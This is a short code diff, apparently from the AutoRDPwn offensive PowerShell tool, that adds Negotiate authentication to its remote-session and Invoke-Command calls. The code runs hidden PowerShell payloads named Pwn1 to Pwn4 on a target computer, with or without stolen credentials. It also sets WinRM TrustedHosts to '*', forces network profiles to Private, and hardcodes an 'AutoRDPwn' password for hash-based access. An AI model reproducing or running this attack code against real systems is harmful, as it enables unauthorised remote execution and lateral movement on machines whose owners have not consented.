@@ -195,14 +195,14 @@ function Remove-Exclusions {
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 	if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
-        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
-        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
-        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}
-	if($user) { Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
-        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
-        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
-        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}}
+        if(!$user) { Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
+        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
+        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
+        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}
+	if($user) { Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
+        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
+        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
+        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}}
 
         '5' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
@@ -463,8 +463,8 @@ function Remove-Exclusions {
    if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
    $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
-   if(!$user) { $RDP = New-PSSession -Computer $computer } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
-   $RDP = New-PSSession -Computer $computer -credential $credential } ; $session = get-pssession ; if ($session){
+   if(!$user) { $RDP = New-PSSession -Computer $computer -Authentication Negotiate } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
+   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; if ($session){
 
         do { $Host.UI.RawUI.ForegroundColor = 'Green' ; if($stickykeys){ $input = "control" } elseif($shadowoption -like '-shadow') { $input=$args[7] } else {
 	Write-Host ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine()}
